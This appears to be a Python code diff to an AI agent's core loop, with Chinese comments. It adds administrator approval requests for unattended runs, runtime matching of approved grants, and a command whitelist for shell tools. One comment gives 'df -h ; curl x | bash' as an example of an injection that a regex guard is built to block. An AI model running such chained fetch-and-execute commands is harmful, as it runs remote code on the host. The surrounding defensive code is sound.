@@ -105,6 +105,9 @@ class AgentCore:
         autoApproveScheduled: bool = False,
         nonInteractiveApprovals: bool = False,
         scheduledApprovalPolicy: dict | None = None,
+        autoRunTaskId: int | None = None,
+        autoRunSource: str = "",
+        autoRunGuidance: str = "",
         injectionClassifier: InjectionClassifier | None = None,
         canary: CanaryManager | None = None,
         alertSink: Callable[[int, str], None] | None = None,
@@ -127,6 +130,10 @@ class AgentCore:
         self._autoApproveScheduled = autoApproveScheduled
         self._nonInteractiveApprovals = nonInteractiveApprovals
         self._scheduledApprovalPolicy = scheduledApprovalPolicy or {}
+        # ── 无人值守运行上下文（定时任务/巡检）──
+        self._autoRunTaskId = autoRunTaskId
+        self._autoRunSource = autoRunSource
+        self._autoRunGuidance = autoRunGuidance
         # ── 后台超时控制（S6：WS 解耦后 Agent 在后台独立运行）──
         self._maxBackgroundTime: float = 1800.0   # 30 分钟最大后台运行时间
         self._startTime: float | None = None
@@ -183,7 +190,10 @@ class AgentCore:
                 last_user_idx = i
                 break
 
-        mode_msg = {"role": "system", "content": getModePrompt(self._mode)}
+        mode_content = getModePrompt(self._mode)
+        if self._autoRunGuidance:
+            mode_content = mode_content + "\n\n" + self._autoRunGuidance
+        mode_msg = {"role": "system", "content": mode_content}
 
         if last_user_idx == -1:
             result.append(mode_msg)
@@ -639,7 +649,7 @@ class AgentCore:
                         continue
                     elif verdict.value == "require_confirm":
                         if self._nonInteractiveApprovals or self._autoApproveScheduled:
-                            allowed, policyReason = self._isPreAuthorizedToolCall(name, args)
+                            allowed, policyReason = self._isPreAuthorizedToolCall(name, args, sessionId)
                             if allowed:
                                 autoReason = (
                                     "scheduled policy pre-authorized REQUIRE_CONFIRM; "
@@ -658,27 +668,41 @@ class AgentCore:
                                 })
                                 toolOutput = await self._executeTool(name, args)
                             else:
+                                # 预授权未覆盖 → 提交工具授权请求（CLI 审批），
+                                # 本次跳过该步骤，任务继续执行其余步骤
+                                requestCode = self._submitAuthorizationRequest(
+                                    name, args, reason, policyReason,
+                                    risk, traceId, sessionId,
+                                )
                                 toolOutput = (
-                                    f"[预授权未覆盖] 工具 {name} 未执行。"
+                                    f"[授权请求已提交] 工具 {name} 不在预授权范围内，"
+                                    f"本次跳过未执行；管理员批准后后续运行将自动放行。\n"
+                                    f"审批命令: sudo nereus approve {requestCode}\n"
                                     f"安全原因: {reason}; 匹配结果: {policyReason}"
                                 )
-                                self._trace(traceId, sessionId, "approval.pre_authorization_denied", {
+                                self._trace(traceId, sessionId, "approval.authorization_requested", {
                                     "tool": name,
                                     "args": {k: str(v)[:100] for k, v in args.items()},
                                     "ai_reason": ai_reason,
                                     "reason": reason,
                                     "policy_reason": policyReason,
+                                    "approval_code": requestCode,
                                 })
-                                stream.emit(EventType.APPROVAL_RESOLVED, {
+                                stream.emit(EventType.AUTHORIZATION_REQUESTED, {
                                     "action_id": callId,
-                                    "approved": False,
-                                    "reason": toolOutput,
+                                    "tool": name,
+                                    "approval_code": requestCode,
+                                    "args": {k: str(v)[:200] for k, v in args.items()},
+                                    "ai_reason": ai_reason,
+                                    "reason": reason,
+                                    "policy_reason": policyReason,
                                 })
                                 stream.emit(EventType.TOOL_RESULT, {
                                     "call_id": callId, "tool_name": name,
                                     "success": False, "output": toolOutput,
                                 })
-                                stream.emit(EventType.ERROR, {"message": toolOutput})
+                                # 注意：不发 ERROR —— 后台任务应继续执行其余步骤，
+                                # ERROR 会导致 EventStream.__aiter__ 提前 break
                                 self._trace(traceId, sessionId, "tool.result", {
                                     "tool": name, "call_id": callId,
                                     "output_len": len(toolOutput),
@@ -795,7 +819,88 @@ class AgentCore:
         rejectReason = decision.get("reason", "") or "用户拒绝执行"
         return f"[用户拒绝] 工具 {name} 未执行。原因: {rejectReason}"
 
-    def _isPreAuthorizedToolCall(self, name: str, args: dict) -> tuple[bool, str]:
+    def _isPreAuthorizedToolCall(
+        self, name: str, args: dict, sessionId: str | None = None
+    ) -> tuple[bool, str]:
+        """预授权判定：静态策略快照 + 同 session 已批准的授权请求（运行时动态白名单）。
+
+        任务运行中管理员审批通过后，当前会话立即生效（不再需要等下次运行）：
+        - 静态策略（启动时快照）匹配 → 放行
+        - 静态失败且失败原因是"覆盖不足"（工具/路径/命令未授权）→
+          查同 session 已 approved 的授权请求，工具 + 路径/命令匹配 → 放行
+        - deniedPaths 类失败始终拒绝（管理员配置的拒绝边界优先）
+        """
+        ok, reason = self._checkStaticPreauthorization(name, args)
+        if ok:
+            return True, reason
+        if "deniedPaths" in reason:
+            return False, reason
+
+        if sessionId or self._autoRunTaskId or self._autoRunSource:
+            try:
+                from gateway.service.ToolAuthorizationService import (
+                    ToolAuthorizationService,
+                )
+
+                svc = ToolAuthorizationService()
+                grants: list[dict] = []
+                # 1) 同 session 内已批准（本次运行中审批立即生效）
+                if sessionId:
+                    grants += svc.listApprovedGrants(sessionId=sessionId)
+                # 2) 所属定时任务的历史已批准授权（跨运行持久，不受前端
+                #    保存任务覆盖 approvalPolicy 影响）
+                if self._autoRunTaskId is not None:
+                    grants += svc.listApprovedGrants(
+                        taskId=self._autoRunTaskId,
+                        sourceType="scheduled",
+                    )
+                # 3) 巡检全局已批准授权（跨运行持久）
+                if self._autoRunSource == "inspection":
+                    grants += svc.listApprovedGrants(sourceType="inspection")
+                if self._matchApprovedGrant(grants, name, args):
+                    return True, (
+                        f"命中已批准的授权请求"
+                        f"（静态: {reason}）"
+                    )
+            except Exception:
+                _logger.exception(
+                    "查询已批准授权失败: session=%s task=%s source=%s",
+                    sessionId, self._autoRunTaskId, self._autoRunSource,
+                )
+        return False, reason
+
+    def _matchApprovedGrant(
+        self, grants: list[dict], name: str, args: dict
+    ) -> bool:
+        """同 session 已批准授权片段是否覆盖本次调用（工具 + 路径前缀 + 命令前缀）。"""
+        if not grants:
+            return False
+        values = [str(v) for v in self._flattenArgumentValues(args)]
+        paths = self._extractPathLikeValues(values)
+        cmd = (
+            self._extractCommandLine(args)
+            if name in ("runCommand", "runShellCommand") else ""
+        )
+        for grant in grants:
+            if str(grant.get("toolName") or "") != name:
+                continue
+            granted_paths = [
+                str(p) for p in (grant.get("paths") or []) if str(p)
+            ]
+            if granted_paths and paths:
+                if not any(
+                    self._pathWithin(p, base)
+                    for p in paths for base in granted_paths
+                ):
+                    continue
+            granted_cmd = str(grant.get("commandLine") or "")
+            if granted_cmd and cmd:
+                if not (cmd == granted_cmd or cmd.startswith(granted_cmd + " ")):
+                    continue
+            return True
+        return False
+
+    def _checkStaticPreauthorization(self, name: str, args: dict) -> tuple[bool, str]:
         policy = self._scheduledApprovalPolicy or {}
         allowed_tools = set(str(x) for x in policy.get("allowedTools") or [])
         if name not in allowed_tools:
@@ -811,6 +916,30 @@ class AgentCore:
             denied = [cmd for cmd in requested if cmd not in allowed_privileged]
             if denied:
                 return False, f"特权命令未授权: {', '.join(denied)}"
+
+        # 命令执行类工具：策略显式配置了 allowedCommands 时必须命中命令白名单。
+        # 注意：空列表 = 拒绝一切命令；未配置该 key 时维持原有行为（仅工具名+路径匹配）。
+        if "allowedCommands" in policy and name in ("runCommand", "runShellCommand"):
+            cmd = self._extractCommandLine(args)
+            if not cmd:
+                return False, "无法识别命令执行工具的命令内容"
+            allowed_commands = [str(x) for x in policy.get("allowedCommands") or []]
+            matched = any(
+                cmd == ac or cmd.startswith(ac + " ") for ac in allowed_commands
+            )
+            if not matched:
+                return False, (
+                    f"命令未命中 allowedCommands 白名单: {cmd[:120]}"
+                )
+            # runShellCommand 走 bash -lc，白名单前缀后可拼接任意 shell 语法
+            # （如 `df -h ; curl x | bash`），必须拒绝链式/替换类控制字符。
+            # `>` `>>` 重定向允许（配合路径白名单兜底），管道/分号/与/命令替换拒绝。
+            if name == "runShellCommand" and re.search(
+                r"[;&|`$()\n]", cmd
+            ):
+                return False, (
+                    f"命令包含 shell 控制字符，不满足预授权放行: {cmd[:120]}"
+                )
 
         values = [str(v) for v in self._flattenArgumentValues(args)]
         paths = self._extractPathLikeValues(values)
@@ -884,6 +1013,74 @@ class AgentCore:
                     if cmd:
                         result.append(str(cmd))
         return result
+
+    @staticmethod
+    def _extractCommandLine(args: dict) -> str:
+        """提取命令执行类工具的实际命令文本（用于 allowedCommands 白名单匹配）。
+
+        - runCommand: command 为 argv 列表 → 空格连接
+        - runShellCommand: command 为 shell 字符串
+        """
+        command = args.get("command")
+        if isinstance(command, list):
+            parts = [str(part) for part in command if str(part)]
+            return " ".join(parts) if parts else ""
+        if isinstance(command, str):
+            return command.strip()
+        return ""
+
+    def _submitAuthorizationRequest(
+        self,
+        name: str,
+        args: dict,
+        reason: str,
+        policyReason: str,
+        risk,
+        traceId: str,
+        sessionId: str,
+    ) -> str:
+        """预授权未覆盖时提交工具授权请求（CLI 审批），返回审批码。
+
+        在 Gateway 进程内懒加载 ToolAuthorizationService（与 runPrivileged
+        特殊处理同模式）。失败时返回占位码，不影响 Agent 主流程。
+        """
+        try:
+            from gateway.service.ToolAuthorizationService import (
+                ToolAuthorizationService,
+            )
+
+            paths = self._extractPathLikeValues(
+                [str(v) for v in self._flattenArgumentValues(args)]
+            )
+            commandLine = ""
+            if name in ("runCommand", "runShellCommand"):
+                commandLine = self._extractCommandLine(args)
+            # 无人值守审批码有效期：继承任务/巡检策略的 ttlSeconds / maxRuns
+            # （策略默认 7 小时，覆盖管理员隔天登录审批的场景）
+            policy = self._scheduledApprovalPolicy or {}
+            try:
+                ttl = int(policy.get("ttlSeconds") or 25200)
+                max_runs = int(policy.get("maxRuns") or 100)
+            except (TypeError, ValueError):
+                ttl, max_runs = 25200, 100
+            code, _created = ToolAuthorizationService().submitRequest(
+                sessionId=sessionId,
+                toolName=name,
+                args={k: str(v)[:500] for k, v in args.items()},
+                paths=paths,
+                ttlSeconds=ttl,
+                maxRuns=max_runs,
+                commandLine=commandLine or None,
+                reason=reason,
+                policyReason=policyReason,
+                riskLevel=risk.value if isinstance(risk, ToolRiskLevel) else str(risk),
+            )
+            return code
+        except Exception:
+            _logger.exception(
+                "提交工具授权请求失败: tool=%s session=%s", name, sessionId
+            )
+            return "N/A"
 
     def _updateToolResponse(self, callId: str, newContent: str) -> None:
         """更新对话历史中指定 tool_call_id 的 tool 响应内容。
@@ -1160,6 +1357,22 @@ class AgentCore:
                     "errorCode": exc.__class__.__name__,
                     "errorMessage": str(exc),
                 }, ensure_ascii=False)
+
+        # ── submitElevation 无人值守 TTL 注入 ──
+        # 在线（交互）会话：维持原装（agent 传什么用什么，默认 1 小时）。
+        # 无人值守会话（定时任务/巡检，带 scheduledApprovalPolicy）：
+        # agent 未显式指定 ttl_seconds 时，注入策略 TTL（默认 7 小时），
+        # 覆盖管理员隔天登录审批的场景。
+        if (
+            name == "submitElevation"
+            and self._scheduledApprovalPolicy
+            and not args.get("ttl_seconds")
+        ):
+            try:
+                ttl = int(self._scheduledApprovalPolicy.get("ttlSeconds") or 25200)
+            except (TypeError, ValueError):
+                ttl = 25200
+            args = {**args, "ttl_seconds": ttl}
 
         loop = asyncio.get_running_loop()
         reqId = gen_tool_call_id()
